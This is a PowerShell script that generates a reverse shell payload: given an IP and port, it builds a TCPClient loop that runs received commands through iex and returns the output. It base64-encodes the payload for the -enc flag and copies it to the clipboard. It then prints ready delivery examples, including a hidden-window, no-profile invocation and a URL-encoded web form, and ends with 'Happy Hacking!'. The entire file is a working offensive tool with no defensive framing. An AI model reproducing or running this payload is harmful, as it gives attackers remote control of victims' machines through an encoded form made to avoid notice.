# Windows: .\rev-shell.ps1 -ip 127.0.0.1 -port 1337
# Linux: pwsh rev-shell.ps1 -ip 127.0.0.1 -port 1337
# 
# Grabbing IP and port
param(
    [Parameter()]
    [String]$ip,
    [String]$port
)

# Check if parameters are provided
if (-not $ip -or -not $port) {
    Write-Host "Error: Requires an IP address and a port"
    exit 1
}

#Creating and encoding rev shell into base64
$Text = '$client = New-Object System.Net.Sockets.TCPClient("' + $ip + '",' + $port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

Write-Output "`nOne-liner:"
Write-Output $Text

Write-Output "`nBase64 Encoded: "
Write-Output $EncodedText


# Determine the OS to see how to copy to clipboard
if ($IsWindows) {
    Set-Clipboard -Value $EncodedText
    Write-Output "`nAutomatically copied to clipboard!"
} else {

    # Command to echo the variable value and pipe it to xclip or xsel
    $commandXclip = "echo '$EncodedText' | xclip -selection clipboard"
    $commandXsel = "echo '$EncodedText' | xsel --clipboard --input"
    
    # Check if xclip is available, otherwise use xsel
    if (Get-Command xclip -ErrorAction SilentlyContinue) {
        Invoke-Expression $commandXclip
        Write-Output "`nAutomatically copied to clipboard!"
    } elseif (Get-Command xsel -ErrorAction SilentlyContinue) {
        Invoke-Expression $commandXsel
        Write-Output "`nAutomatically copied to clipboard!"
    } else {
        Write-Output "`nNo suitable clipboard tool (xclip or xsel) found. Not copied to clipboard, but shell still created. Install xclip or xsel to automatically copy shell to clipboard =)"
    }

    Write-Output "`nNote: Just the payload, can execute it in powershell by a couple different ways."
    Write-Output "Web Ex: powershell%20-enc%20JABjAGwAaQBlA..."
    Write-Output "Ex: powershell -nop -w hidden -e JABjAGwAaQBlA..."
    Write-Output "Ex: powershell -enc JABjAGwAaQBlA..."
    Write-Output "Ex: powershell -e JABjAGwAaQBlA..."
    Write-Output "Happy Hacking!`n"
}
